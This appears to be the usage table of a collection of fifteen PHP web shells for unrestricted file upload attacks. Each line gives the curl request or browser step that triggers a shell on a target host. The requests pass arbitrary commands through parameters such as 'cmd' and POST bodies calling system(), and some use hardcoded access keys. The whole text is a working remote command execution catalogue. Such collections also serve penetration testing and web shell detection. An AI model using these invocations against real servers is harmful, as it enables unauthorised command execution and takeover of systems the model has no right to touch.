# USAGE

Payload || Invoke Command
UFU-PHP-P01.php || curl {{HOST}}/UFU-PHP-P01.php?a={{PAYLOAD}}
UFU-PHP-P02.php || curl -X POST -d "hkwwj={{PAYLOAD}}" {{HOST}}/UFU-PHP-P02.php
UFU-PHP-P03.php || curl -X POST -d "password=lol&cmd={{PAYLOAD}}" {{HOST}}/UFU-PHP-P03.php
UFU-PHP-P04.php || curl -X POST -d "tt1234=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P04.php
UFU-PHP-P05.php || curl -X POST -d "_=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P05.php
UFU-PHP-P06.php || curl -X POST -d "_=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P06.php
UFU-PHP-P07.php || curl -X POST -d "_=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P07.php
UFU-PHP-P08.php || curl -X POST -d "_=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P08.php
UFU-PHP-P09.php || Browser Navigation To {{HOST}}/UFU-PHP-P09.php
UFU-PHP-P10.php || Browser Navigation To {{HOST}}/UFU-PHP-P10.php
UFU-PHP-P11.php || curl {{HOST}}/UFU-PHP-P11.php?cmd={{PAYLOAD}}
UFU-PHP-P12.php || Browser Navigation To {{HOST}}/UFU-PHP-P12.php
UFU-PHP-P13.php || Browser Navigation To {{HOST}}/UFU-PHP-P13.php?key=hehe
UFU-PHP-P14.php || Browser Navigation To {{HOST}}/UFU-PHP-P14.php
UFU-PHP-P15.php || curl -X POST -d "-7=system('{{PAYLOAD}}')" {{HOST}}/UFU-PHP-P15.php
